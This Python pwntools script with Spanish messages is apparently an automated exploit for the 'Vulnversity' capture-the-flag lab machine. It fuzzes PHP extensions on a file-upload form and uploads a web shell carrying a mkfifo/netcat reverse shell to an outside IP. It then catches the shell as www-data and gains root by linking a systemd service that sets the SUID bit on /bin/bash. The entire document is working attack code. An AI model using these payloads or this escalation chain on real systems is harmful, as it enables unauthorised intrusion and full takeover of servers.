from pwn import *
import requests, signal, sys, time, threading
 
def def_handler(sig, frame):
    print("\n\n[!] Saliendo del programa...\n")
    sys.exit(1)
 
signal.signal(signal.SIGINT, def_handler)
 
# Variables Globales
main_url = "http://vulnuniversity:3333/internal/index.php"
extensions = ['php', 'php3', 'php4', 'php5', 'phtml', 'pht']
lport = 443
 
def getAccess(extension):
    shell_url = "http://vulnuniversity:3333/internal/uploads/file.%s" % extension
    requests.get(shell_url)
 
def fuzzerExtension():
 
    s = requests.session()
 
    for extension in extensions:
        p1.status("Probando con archivo file.%s" % extension)
        file_to_upload = "file.%s" % extension
        uploaded_file = {"file": (file_to_upload, '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.154 443 >/tmp/f"); ?>')}
 
        response = s.post(main_url, files=uploaded_file)
 
        if "Success" in response.text:
            p1.success("La extensión %s es válida" % extension)
            getAccess(extension)
 
        time.sleep(1)
 
if __name__ == '__main__':
 
    p1 = log.progress("Subida de archivos")
 
    try:
        threading.Thread(target=fuzzerExtension).start()
    except Exceptions as e:
        log.error(str(e))
 
    shell = listen(lport, timeout=20).wait_for_connection()
 
    if shell.sock is None:
        log.failure("No se ha recibido ninguna conexión")
    else:
        log.info("Se ha recibido una conexión como el usuario www-data")
 
    shell.sendline("TF=$(mktemp).service")
    shell.sendline("echo '[Service]")
    shell.sendline("Type=oneshot")
    shell.sendline('ExecStart=/bin/sh -c "chmod 4755 /bin/bash"')
    shell.sendline("[Install]")
    shell.sendline("WantedBy=multi-user.target' > $TF")
    shell.sendline("systemctl link $TF")
    shell.sendline("systemctl enable --now $TF")
    shell.sendline("bash -p")
    shell.interactive()
 
